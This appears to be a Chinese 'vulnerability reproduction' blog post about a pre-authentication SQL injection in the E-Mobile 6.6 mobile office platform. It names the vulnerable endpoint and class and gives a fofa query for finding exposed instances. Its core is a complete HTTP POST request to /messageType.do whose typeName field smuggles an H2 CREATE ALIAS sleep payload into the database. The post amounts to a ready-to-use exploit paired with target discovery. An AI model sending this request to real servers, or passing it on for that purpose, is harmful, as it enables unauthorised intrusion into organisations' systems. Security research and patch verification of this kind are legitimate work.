# 疑似 E-Mobile 前台SQL注入漏洞
一漏洞背景
-----

最近传的沸沸扬扬的mobile前台SQL注入漏洞   
 

查询网上部分漏出找到漏洞位置client.do  messageType.do

`WEB-INF/classes/weaver/mobile/core/web/MessageTypeAction.class`

二、漏洞复现  
 

祭出fofa大法，fofa语法如下 

  E-Mobile 6.6

![](%E7%96%91%E4%BC%BC%20E-Mobile%20%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/640wx_fmt%3Dpng%26tp%3Dwebp%26wxfrom%3D5%26wx_lazy%3D1%26wx_co%3D1.webp)

部分网络爆出内容 

获取一个method参数做路由

![](%E7%96%91%E4%BC%BC%20E-Mobile%20%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/640wx_fmt%3Dpng%26tp%3Dwebp%26wxfrom%3D5%26wx_lazy%3D1%26wx_co%3D1.png)

typeid这里限制了为int类型跳过

![](%E7%96%91%E4%BC%BC%20E-Mobile%20%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1_640wx_fmt%3Dpng%26tp%3Dwebp%26wxfrom%3D5%26wx_lazy%3D1%26wx_co%3D1.png)

![](%E7%96%91%E4%BC%BC%20E-Mobile%20%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/2_640wx_fmt%3Dpng%26tp%3Dwebp%26wxfrom%3D5%26wx_lazy%3D1%26wx_co%3D1.png)

method参数等于create时typeName参数存在注入

这样我们就可以Burp构建相关请求了

    POST /messageType.do HTTP/1.1
    Host: xxx.xxx.xxx.xxx
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: JSESSIONID=abc2sezIkpTECehgf1vJx
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 109
    
    
    
    method=create&typeName=1';CREATE ALIAS sleep222 FOR
    "java.lang.Thread.sleep";CALL sleep222(3000);select+'1

![](%E7%96%91%E4%BC%BC%20E-Mobile%20%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/3_640wx_fmt%3Dpng%26tp%3Dwebp%26wxfrom%3D5%26wx_lazy%3D1%26wx_co%3D1.png)
